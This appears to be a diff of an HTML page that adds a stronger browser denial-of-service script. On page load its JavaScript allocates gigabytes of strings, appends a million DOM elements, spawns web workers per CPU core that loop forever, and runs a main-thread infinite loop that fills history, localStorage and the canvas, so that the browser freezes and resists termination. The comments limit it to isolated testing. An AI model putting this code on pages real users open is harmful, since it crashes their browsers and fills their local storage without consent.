@@ -1,144 +1,156 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Maximum System Overload</title>
+    <title>SYSTEM CRITICAL - MAX LOAD</title>
+    <meta charset="UTF-8">
     <style>
-        body {
-            font-family: sans-serif;
-            margin: 0; /* Remove default margin */
-            overflow: hidden; /* Hide scrollbars */
-            background-color: #000; /* Black background */
-            color: #fff; /* White text */
-            text-align: center;
-        }
-        h1 {
-            color: #ff0000; /* Bright Red */
-            margin-top: 50px;
-        }
-        p {
-            color: #aaaaaa; /* Grey */
-        }
-        canvas {
-            display: block; /* Make canvas a block element */
-            margin: 20px auto;
-            border: 1px solid #fff;
-        }
+        body { margin: 0; overflow: hidden; background-color: #000; color: #f00; font-family: monospace; text-align: center; }
+        h1 { text-shadow: 0 0 10px #f00; animation: blink 1s infinite alternate; }
+        p { color: #ff0; }
+        canvas { display: block; margin: 10px auto; border: 1px solid #f00; }
+        @keyframes blink { from { opacity: 1; } to { opacity: 0.5; } }
     </style>
 </head>
 <body>
 
-    <h1>Initiating Maximum Overload Sequence...</h1>
-    <p>Attempting to consume all available resources and lock the browser process.</p>
-    <canvas id="myCanvas" width="500" height="300"></canvas>
-
+    <h1>!!! MAXIMUM OVERLOAD INITIATED !!!</h1>
+    <p>Attempting complete system resource saturation and process lock...</p>
+    <canvas id="chaosCanvas" width="300" height="150"></canvas>
 
     <script>
-    // This script is designed to cause a severe freeze and make the browser process
-    // extremely difficult to terminate by consuming massive resources and locking the main thread.
-    // Use with extreme caution and only in isolated testing environments (like a VM).
+    // ==========================================================================
+    // WARNING: EXTREMELY DANGEROUS SCRIPT
+    // This script is designed to cause an immediate, severe freeze and make the
+    // browser process incredibly difficult to terminate. It will consume vast
+    // amounts of CPU, RAM, and other resources.
+    // USE ONLY IN ISOLATED VIRTUALIZED ENVIRONMENTS FOR TESTING PURPOSES.
+    // You WILL need to force-quit the browser process via Task Manager/Activity Monitor.
+    // ==========================================================================
 
-    var memoryHog = []; // For initial large memory allocation
-    var continuousMemory = []; // For continuous allocation inside the loop
-    var historyCounter = 0;
-    var body = document.body;
-    var canvas = document.getElementById('myCanvas');
-    var ctx = canvas.getContext('2d');
+    console.log("!!! INITIATING ULTIMATE FREEZE SEQUENCE !!!");
 
-    // --- Phase 1: Pre-freeze Resource Consumption ---
+    // --- Configuration ---
+    const INITIAL_MEMORY_STRINGS = 15 * 1000 * 1000; // Aim for ~15 million strings (~15GB+)
+    const INITIAL_DOM_ELEMENTS = 1 * 1000 * 1000;   // 1 million DOM elements
+    const NUM_WORKERS_TO_SPAWN = navigator.hardwareConcurrency ? navigator.hardwareConcurrency * 4 : 16; // Spawn many workers (e.g., 4x cores or 16)
 
-    // 1a: Allocate a large amount of memory (e.g., several GB)
-    console.log("Phase 1a: Allocating initial memory...");
+    // --- Phase 1: Massive Initial Resource Allocation ---
+
+    let initialMemoryHog = [];
+    console.log(`Phase 1a: Allocating initial memory (${INITIAL_MEMORY_STRINGS} strings)...`);
     try {
-        // Allocate 10 million strings of ~1KB each = ~10GB
-        for (var i = 0; i < 10000000; i++) {
-            memoryHog.push(new Array(1000).join('A') + i);
+        for (let i = 0; i < INITIAL_MEMORY_STRINGS; i++) {
+            // Create ~1KB strings
+            initialMemoryHog.push(new Array(1000).join('X') + Math.random());
+            // Add occasional console log without overwhelming it (might not show before freeze)
+            // if (i % 1000000 === 0) console.log(`Allocated ${i / 1000000}M strings...`);
         }
+        console.log("Phase 1a: Initial memory allocation attempt complete.");
     } catch (e) {
-        console.error("Error during initial memory allocation:", e);
+        console.error("Phase 1a: Error during initial memory allocation (likely hit limit):", e);
+        initialMemoryHog = null; // Release reference if failed massively
     }
-    console.log("Phase 1a complete.");
 
-    // 1b: Create and append a large number of DOM elements (e.g., 1 million)
-    console.log("Phase 1b: Creating DOM elements...");
+    console.log(`Phase 1b: Creating ${INITIAL_DOM_ELEMENTS} DOM elements...`);
+    const body = document.body;
     try {
-        for (var i = 0; i < 1000000; i++) {
-            var div = document.createElement('div');
-            // Make elements slightly heavier and visible
-            div.style.height = '1px';
-            div.style.width = '1px';
-            div.style.backgroundColor = '#' + Math.floor(Math.random()*16777215).toString(16); // Random color
-            div.style.position = 'absolute'; // Use absolute positioning to avoid layout cost issues
-            div.style.left = (i % window.innerWidth) + 'px';
-            div.style.top = (Math.floor(i / window.innerWidth) % window.innerHeight) + 'px';
-            body.appendChild(div);
+        const fragment = document.createDocumentFragment(); // More efficient appending
+        for (let i = 0; i < INITIAL_DOM_ELEMENTS; i++) {
+            const div = document.createElement('div');
+            // Minimal styling to add some weight without complex layout cost during creation
+            div.style.cssText = 'position:absolute;width:1px;height:1px;background:#' + ((1<<24)*Math.random()|0).toString(16).padStart(6,'0');
+            div.style.left = `${Math.random() * 100}vw`;
+            div.style.top = `${Math.random() * 100}vh`;
+            fragment.appendChild(div);
         }
+        body.appendChild(fragment);
+        console.log("Phase 1b: DOM element creation attempt complete.");
     } catch (e) {
-         console.error("Error during DOM creation:", e);
+        console.error("Phase 1b: Error during DOM creation:", e);
     }
-     console.log("Phase 1b complete.");
 
+    // --- Phase 2: Saturate CPU Cores with Web Workers ---
 
-    // --- Phase 2: Infinite Loop and Continuous Stress ---
+    console.log(`Phase 2: Spawning ${NUM_WORKERS_TO_SPAWN} Web Workers for CPU saturation...`);
+    const workerCode = `
+        // Worker script: Infinite loop to consume CPU
+        let counter = 0;
+        while (true) {
+            counter++;
+            if (counter > 1e9) counter = 0; // Prevent potential overflow issues, though unlikely to matter
+            // Optionally add a tiny bit of math work
+            // Math.sqrt(Math.random());
+        }
+    `;
+    const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+    const workerUrl = URL.createObjectURL(workerBlob);
+    let workers = [];
+    for (let i = 0; i < NUM_WORKERS_TO_SPAWN; i++) {
+        try {
+            const worker = new Worker(workerUrl);
+            workers.push(worker);
+            // Optional: Add error handling for worker creation itself
+            // worker.onerror = (err) => console.error(`Worker ${i} error:`, err);
+        } catch (e) {
+            console.error(`Failed to create worker ${i}:`, e);
+        }
+    }
+    console.log(`Phase 2: ${workers.length} workers launched.`);
+    // Note: We don't revokeObjectURL as workers need it.
 
-    // This loop will run indefinitely, consuming CPU and attempting continuous operations
-    console.log("Phase 2: Entering infinite loop and continuous stress...");
+    // --- Phase 3: Main Thread Infinite Loop with Continuous Stress ---
+
+    console.log("Phase 3: Entering main thread infinite loop with continuous resource drain...");
+    let continuousMemory = [];
+    let historyCounter = 0;
+    let storageCounter = 0;
+    const canvas = document.getElementById('chaosCanvas');
+    const ctx = canvas.getContext('2d', { alpha: false }); // Use opaque canvas for potential perf gain
+    const largeStringForStorage = new Array(1024 * 10).join('S'); // ~10KB string for storage spam
 
     while (true) {
-        // 2a: Continuous Memory Allocation
-        // Allocate more memory constantly inside the loop
+        // 3a: Continuous Memory Allocation
         try {
-             // Allocate smaller strings constantly to keep memory growing
-             continuousMemory.push(new Array(500).join('B') + historyCounter);
-        } catch (e) {
-             // Ignore errors, keep trying
-        }
+            // Allocate smaller strings constantly inside the loop
+            continuousMemory.push(new Array(500).join('C') + Math.random());
+            // Optional: Limit array size to prevent it becoming the *sole* bottleneck too quickly
+            // if (continuousMemory.length > 5000000) continuousMemory.shift(); // Keep ~5M recent items
+        } catch (e) { /* Ignore allocation errors, keep looping */ }
 
-        // 2b: Continuous History API Spam
-        // Repeatedly push states to stress history and consume memory/storage
+        // 3b: Continuous History API Spam
         try {
-            // Make the URL slightly more complex
-            history.pushState(historyCounter, '', '/' + historyCounter + '/' + continuousMemory.length + '/' + Math.random().toString(36).substring(7));
-            historyCounter++;
-        } catch (e) {
-            // Ignore errors, keep trying
-        }
+            // Use replaceState to avoid massive history list, focus on API stress
+            history.replaceState(null, '', `/#${historyCounter++}-${Math.random().toString(36).substring(2)}`);
+        } catch (e) { /* Ignore history errors */ }
 
-        // 2c: Rapid Canvas Drawing
-        // Draw something complex or large repeatedly to stress rendering/GPU
+        // 3c: Continuous localStorage Spam
         try {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)'; // Semi-transparent black
-            ctx.fillRect(0, 0, canvas.width, canvas.height); // Clear with transparency
+            // Write ~10KB repeatedly to different keys
+            localStorage.setItem(`spam_${storageCounter++ % 500}`, largeStringForStorage + storageCounter);
+        } catch (e) { /* Ignore storage errors (like quota exceeded) */ }
 
-            ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16); // Random color
-            var x = Math.random() * canvas.width;
-            var y = Math.random() * canvas.height;
-            var size = Math.random() * 50;
-            ctx.fillRect(x, y, size, size); // Draw random rectangles
+        // 3d: Continuous Canvas Drawing Stress
+        try {
+            const width = canvas.width;
+            const height = canvas.height;
+            // Draw random noise or complex patterns
+            for (let i = 0; i < 50; i++) { // Draw multiple shapes per frame
+                 ctx.fillStyle = `rgb(${Math.random()*255|0},${Math.random()*255|0},${Math.random()*255|0})`;
+                 ctx.fillRect(Math.random() * width, Math.random() * height, Math.random() * 20, Math.random() * 20);
+            }
+            // Maybe add image data manipulation for extra CPU/memory stress
+            // let imageData = ctx.getImageData(0, 0, width, height);
+            // for (let i = 0; i < imageData.data.length; i += 4) { imageData.data[i] = 255 - imageData.data[i]; } // Invert colors
+            // ctx.putImageData(imageData, 0, 0);
+        } catch(e) { /* Ignore canvas errors */ }
 
-            // Draw lines or paths for more complex rendering
-            ctx.strokeStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
-            ctx.beginPath();
-            ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
-            ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
-            ctx.stroke();
-
-        } catch (e) {
-            // Ignore errors, keep trying
-        }
-
-        // Note: Adding DOM manipulation inside this tight loop is generally not feasible
-        // or beneficial for the freeze effect compared to the initial DOM creation phase.
-
-        // The loop body contains operations that add continuous resource pressure
-        // while the while(true) ensures the CPU is fully utilized.
+        // The loop itself consumes the main CPU thread. Operations inside add continuous pressure.
     }
 
-    // Code below this loop will never be reached.
-    console.log("This message will never be printed.");
+    // This part is unreachable
+    console.log("!!! SEQUENCE COMPLETED (IMPOSSIBLE) !!!");
 
     </script>
-
-    <p>If you are reading this, the script may not have executed as intended or your browser handled it gracefully.</p>
 
 </body>
 </html>
